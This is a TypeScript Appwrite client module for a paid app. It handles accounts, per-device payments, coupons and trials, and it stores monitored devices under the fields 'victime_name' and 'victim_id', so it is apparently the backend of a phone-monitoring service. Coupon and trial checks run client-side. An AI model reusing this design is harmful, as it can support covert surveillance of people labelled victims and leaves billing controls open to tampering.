import { Client, Account, Databases, Storage, Avatars, ID, Query } from 'appwrite';

// Appwrite Configuration - same as Master3 app
export const appwriteConfig = {
  endpoint: "https://cloud.appwrite.io/v1",
  projectId: "66f2579c002ae28287de",
  databaseId: "66f2586d003223ce58b6",
  storageId: "66f2584b00068c76ed1b",
  userCollectionId: "66f259820009c9236589",
  childCollectionId: "66f3e360003a674e4bde",
  paymentCollectionId: "66f8107a00211893d145",
  couponCollectionId: process.env.NEXT_PUBLIC_APPWRITE_COUPON_COLLECTION_ID || 'coupon_collection_id',
  trialCollectionId: process.env.NEXT_PUBLIC_APPWRITE_TRIAL_COLLECTION_ID || 'trial_collection_id',
};

// Initialize Appwrite Client
const client = new Client()
  .setEndpoint(appwriteConfig.endpoint)
  .setProject(appwriteConfig.projectId);

export const account = new Account(client);
export const databases = new Databases(client);
export const storage = new Storage(client);
export const avatars = new Avatars(client);

export interface User {
  $id: string;
  accountId: string;
  email: string;
  username: string;
  avatar: string;
  isInitial?: boolean;
}

export interface Child {
  $id: string;
  client_id: string;
  victime_name: string;
  victim_id: string;
  is_Premium: boolean;
}

export interface Payment {
  $id: string;
  client_id: string;
  device_name: string;
  device_id: string;
  date: string;
  amount: number;
  status: boolean;
}

export interface Coupon {
  $id: string;
  code: string;
  description?: string;
  discount_type: 'percent' | 'fixed';
  discount_value: number;
  is_active: boolean;
  expires_at?: string;
  max_redemptions?: number;
  redemption_count?: number;
}

export interface TrialState {
  $id: string;
  client_id: string;
  device_id: string;
  used_count: number;
  max_uses: number;
  trial_started_at: string;
  trial_expires_at: string;
  last_used_at?: string;
}

export interface CouponValidationResult {
  valid: boolean;
  message: string;
  coupon: Coupon | null;
  discountAmount: number;
  finalAmount: number;
}

export interface TrialAccessResult {
  allowed: boolean;
  usedCount: number;
  remaining: number;
  maxUses: number;
  expiresAt: string | null;
  message: string;
}

const TRIAL_MAX_USES = 3;

const normalizeCouponCode = (code: string) => code.trim().toUpperCase();

const addOneMonth = (input: Date) => {
  const out = new Date(input);
  out.setMonth(out.getMonth() + 1);
  return out;
};

export function calculateDiscountedAmount(amount: number, coupon: Coupon | null) {
  if (!coupon) {
    return {
      discountAmount: 0,
      finalAmount: amount,
    };
  }

  const rawDiscount = coupon.discount_type === 'percent'
    ? (amount * coupon.discount_value) / 100
    : coupon.discount_value;

  const discountAmount = Math.max(0, Math.min(amount, Number(rawDiscount.toFixed(2))));
  const finalAmount = Math.max(0, Number((amount - discountAmount).toFixed(2)));

  return { discountAmount, finalAmount };
}

// Auth Functions
export async function createUser(email: string, password: string, username: string): Promise<User> {
  try {
    const newAccount = await account.create(ID.unique(), email, password, username);
    if (!newAccount) throw new Error('Failed to create account');

    const avatarUrl = avatars.getInitials(username);

    await signIn(email, password);

    const newUser = await databases.createDocument(
      appwriteConfig.databaseId,
      appwriteConfig.userCollectionId,
      ID.unique(),
      {
        accountId: newAccount.$id,
        email,
        username,
        avatar: avatarUrl.toString(),
        isInitial: false,
      }
    );

    return newUser as unknown as User;
  } catch (error) {
    throw new Error(error instanceof Error ? error.message : 'Registration failed');
  }
}

export async function signIn(email: string, password: string) {
  try {
    try {
      await account.deleteSession('current');
    } catch {
      // Ignore if no existing session
    }

    return await account.createEmailPasswordSession(email, password);
  } catch (error) {
    throw new Error(error instanceof Error ? error.message : 'Sign in failed');
  }
}

export async function signOut() {
  try {
    await account.deleteSession('current');
  } catch {
    throw new Error('Unable to sign out. Please try again.');
  }
}

export async function getAccount() {
  try {
    return await account.get();
  } catch {
    return null;
  }
}

export async function getCurrentUser(): Promise<User | null> {
  try {
    const currentAccount = await getAccount();
    if (!currentAccount) return null;

    const currentUser = await databases.listDocuments(
      appwriteConfig.databaseId,
      appwriteConfig.userCollectionId,
      [Query.equal('accountId', currentAccount.$id)]
    );

    if (!currentUser.documents.length) return null;
    return currentUser.documents[0] as unknown as User;
  } catch (error) {
    console.error('Get current user error:', error);
    return null;
  }
}

export async function updateUserPassword(newPassword: string, oldPassword: string) {
  try {
    return await account.updatePassword(newPassword, oldPassword);
  } catch (error) {
    throw new Error(error instanceof Error ? error.message : 'Password update failed');
  }
}

export async function requestPasswordRecovery(email: string) {
  try {
    return await account.createRecovery(email, '');
  } catch (error) {
    throw new Error(error instanceof Error ? error.message : 'Password recovery failed');
  }
}

export async function updateUserIsInitial(userId: string, isInitial: boolean) {
  try {
    return await databases.updateDocument(
      appwriteConfig.databaseId,
      appwriteConfig.userCollectionId,
      userId,
      { isInitial }
    );
  } catch (error) {
    throw new Error(error instanceof Error ? error.message : 'Update failed');
  }
}

// Child/Device Functions
export async function createChild(form: { client_id: string; victim_name: string; victim_id: string }): Promise<Child> {
  try {
    const newChild = await databases.createDocument(
      appwriteConfig.databaseId,
      appwriteConfig.childCollectionId,
      ID.unique(),
      {
        client_id: form.client_id,
        victime_name: form.victim_name,
        victim_id: form.victim_id,
        is_Premium: false,
      }
    );

    return newChild as unknown as Child;
  } catch (error) {
    throw new Error(error instanceof Error ? error.message : 'Failed to add device');
  }
}

export async function updateChild(id: string): Promise<Child> {
  try {
    const updatedChild = await databases.updateDocument(
      appwriteConfig.databaseId,
      appwriteConfig.childCollectionId,
      id,
      { is_Premium: true }
    );

    return updatedChild as unknown as Child;
  } catch (error) {
    throw new Error(error instanceof Error ? error.message : 'Failed to update device');
  }
}

export async function getAllChild(accountId: string): Promise<Child[]> {
  try {
    const children = await databases.listDocuments(
      appwriteConfig.databaseId,
      appwriteConfig.childCollectionId,
      [Query.equal('client_id', accountId)]
    );

    return children.documents as unknown as Child[];
  } catch (error) {
    throw new Error(error instanceof Error ? error.message : 'Failed to get devices');
  }
}

// Payment Functions
export async function createPayment(form: {
  client_id: string;
  device_name: string;
  device_id: string;
  date: string;
  amount: number;
  status: boolean;
}): Promise<boolean> {
  try {
    await databases.createDocument(
      appwriteConfig.databaseId,
      appwriteConfig.paymentCollectionId,
      ID.unique(),
      form
    );

    return true;
  } catch {
    return false;
  }
}

export async function getAllPayments(accountId: string): Promise<Payment[]> {
  try {
    const payments = await databases.listDocuments(
      appwriteConfig.databaseId,
      appwriteConfig.paymentCollectionId,
      [Query.equal('client_id', accountId)]
    );

    return payments.documents as unknown as Payment[];
  } catch (error) {
    throw new Error(error instanceof Error ? error.message : 'Failed to get payments');
  }
}

// Coupon helpers
export async function getCoupons(): Promise<Coupon[]> {
  try {
    const result = await databases.listDocuments(
      appwriteConfig.databaseId,
      appwriteConfig.couponCollectionId,
      [Query.orderDesc('$createdAt'), Query.limit(200)]
    );

    return result.documents as unknown as Coupon[];
  } catch {
    return [];
  }
}

export async function createCoupon(payload: {
  code: string;
  description?: string;
  discount_type: 'percent' | 'fixed';
  discount_value: number;
  is_active?: boolean;
  expires_at?: string;
  max_redemptions?: number;
}) {
  const safeCode = normalizeCouponCode(payload.code);

  return await databases.createDocument(
    appwriteConfig.databaseId,
    appwriteConfig.couponCollectionId,
    ID.unique(),
    {
      code: safeCode,
      description: payload.description || '',
      discount_type: payload.discount_type,
      discount_value: payload.discount_value,
      is_active: payload.is_active ?? true,
      expires_at: payload.expires_at || null,
      max_redemptions: payload.max_redemptions ?? 0,
      redemption_count: 0,
    }
  );
}

export async function updateCoupon(
  id: string,
  payload: Partial<{
    code: string;
    description: string;
    discount_type: 'percent' | 'fixed';
    discount_value: number;
    is_active: boolean;
    expires_at: string | null;
    max_redemptions: number;
    redemption_count: number;
  }>
) {
  const nextPayload = { ...payload };
  if (nextPayload.code) {
    nextPayload.code = normalizeCouponCode(nextPayload.code);
  }

  return await databases.updateDocument(
    appwriteConfig.databaseId,
    appwriteConfig.couponCollectionId,
    id,
    nextPayload
  );
}

export async function deleteCoupon(id: string) {
  return await databases.deleteDocument(
    appwriteConfig.databaseId,
    appwriteConfig.couponCollectionId,
    id
  );
}

export async function getCouponByCode(code: string): Promise<Coupon | null> {
  const normalizedCode = normalizeCouponCode(code);
  if (!normalizedCode) return null;

  try {
    const result = await databases.listDocuments(
      appwriteConfig.databaseId,
      appwriteConfig.couponCollectionId,
      [Query.equal('code', normalizedCode), Query.limit(1)]
    );

    if (!result.documents.length) return null;
    return result.documents[0] as unknown as Coupon;
  } catch {
    return null;
  }
}

export async function validateCouponCode(code: string, amount: number): Promise<CouponValidationResult> {
  const coupon = await getCouponByCode(code);

  if (!coupon) {
    return {
      valid: false,
      message: 'Coupon not found.',
      coupon: null,
      discountAmount: 0,
      finalAmount: amount,
    };
  }

  if (!coupon.is_active) {
    return {
      valid: false,
      message: 'Coupon is inactive.',
      coupon,
      discountAmount: 0,
      finalAmount: amount,
    };
  }

  if (coupon.expires_at && new Date(coupon.expires_at).getTime() < Date.now()) {
    return {
      valid: false,
      message: 'Coupon has expired.',
      coupon,
      discountAmount: 0,
      finalAmount: amount,
    };
  }

  const maxRedemptions = coupon.max_redemptions || 0;
  const redemptionCount = coupon.redemption_count || 0;
  if (maxRedemptions > 0 && redemptionCount >= maxRedemptions) {
    return {
      valid: false,
      message: 'Coupon redemption limit reached.',
      coupon,
      discountAmount: 0,
      finalAmount: amount,
    };
  }

  const { discountAmount, finalAmount } = calculateDiscountedAmount(amount, coupon);

  return {
    valid: true,
    message: 'Coupon applied successfully.',
    coupon,
    discountAmount,
    finalAmount,
  };
}

export async function incrementCouponRedemption(couponId: string, nextCount: number) {
  try {
    await updateCoupon(couponId, { redemption_count: nextCount });
  } catch {
    // Do not block payment flow
  }
}

// Trial helpers
export async function getTrialStatus(clientId: string, deviceId: string): Promise<TrialAccessResult> {
  try {
    const result = await databases.listDocuments(
      appwriteConfig.databaseId,
      appwriteConfig.trialCollectionId,
      [Query.equal('client_id', clientId), Query.equal('device_id', deviceId), Query.limit(1)]
    );

    const trial = result.documents[0] as unknown as TrialState | undefined;

    if (!trial) {
      return {
        allowed: true,
        usedCount: 0,
        remaining: TRIAL_MAX_USES,
        maxUses: TRIAL_MAX_USES,
        expiresAt: null,
        message: 'Trial is available.',
      };
    }

    const expiresAtTime = new Date(trial.trial_expires_at).getTime();
    const isExpired = Number.isFinite(expiresAtTime) && expiresAtTime < Date.now();
    const usedCount = trial.used_count || 0;
    const maxUses = trial.max_uses || TRIAL_MAX_USES;
    const remaining = Math.max(0, maxUses - usedCount);

    if (isExpired) {
      return {
        allowed: false,
        usedCount,
        remaining: 0,
        maxUses,
        expiresAt: trial.trial_expires_at,
        message: 'Trial period has ended.',
      };
    }

    return {
      allowed: remaining > 0,
      usedCount,
      remaining,
      maxUses,
      expiresAt: trial.trial_expires_at,
      message: remaining > 0 ? 'Trial access available.' : 'Trial usage limit reached.',
    };
  } catch {
    return {
      allowed: false,
      usedCount: 0,
      remaining: 0,
      maxUses: TRIAL_MAX_USES,
      expiresAt: null,
      message: 'Unable to verify trial access.',
    };
  }
}

export async function consumeTrialAccess(clientId: string, deviceId: string): Promise<TrialAccessResult> {
  try {
    const result = await databases.listDocuments(
      appwriteConfig.databaseId,
      appwriteConfig.trialCollectionId,
      [Query.equal('client_id', clientId), Query.equal('device_id', deviceId), Query.limit(1)]
    );

    const now = new Date();
    const nowIso = now.toISOString();

    if (!result.documents.length) {
      const expiresAt = addOneMonth(now).toISOString();

      await databases.createDocument(
        appwriteConfig.databaseId,
        appwriteConfig.trialCollectionId,
        ID.unique(),
        {
          client_id: clientId,
          device_id: deviceId,
          used_count: 1,
          max_uses: TRIAL_MAX_USES,
          trial_started_at: nowIso,
          trial_expires_at: expiresAt,
          last_used_at: nowIso,
        }
      );

      return {
        allowed: true,
        usedCount: 1,
        remaining: TRIAL_MAX_USES - 1,
        maxUses: TRIAL_MAX_USES,
        expiresAt,
        message: `Trial activated. ${TRIAL_MAX_USES - 1} uses left this month.`,
      };
    }

    const trial = result.documents[0] as unknown as TrialState;
    const usedCount = trial.used_count || 0;
    const maxUses = trial.max_uses || TRIAL_MAX_USES;
    const expiresAtTime = new Date(trial.trial_expires_at).getTime();
    const isExpired = Number.isFinite(expiresAtTime) && expiresAtTime < Date.now();

    if (isExpired) {
      return {
        allowed: false,
        usedCount,
        remaining: 0,
        maxUses,
        expiresAt: trial.trial_expires_at,
        message: 'Your one-month free trial has expired.',
      };
    }

    if (usedCount >= maxUses) {
      return {
        allowed: false,
        usedCount,
        remaining: 0,
        maxUses,
        expiresAt: trial.trial_expires_at,
        message: 'You used all 3 trial accesses for this month.',
      };
    }

    const nextUsedCount = usedCount + 1;

    await databases.updateDocument(
      appwriteConfig.databaseId,
      appwriteConfig.trialCollectionId,
      trial.$id,
      {
        used_count: nextUsedCount,
        last_used_at: nowIso,
      }
    );

    return {
      allowed: true,
      usedCount: nextUsedCount,
      remaining: Math.max(0, maxUses - nextUsedCount),
      maxUses,
      expiresAt: trial.trial_expires_at,
      message: `Trial access used (${nextUsedCount}/${maxUses}).`,
    };
  } catch {
    return {
      allowed: false,
      usedCount: 0,
      remaining: 0,
      maxUses: TRIAL_MAX_USES,
      expiresAt: null,
      message: 'Unable to consume trial access at this time.',
    };
  }
}
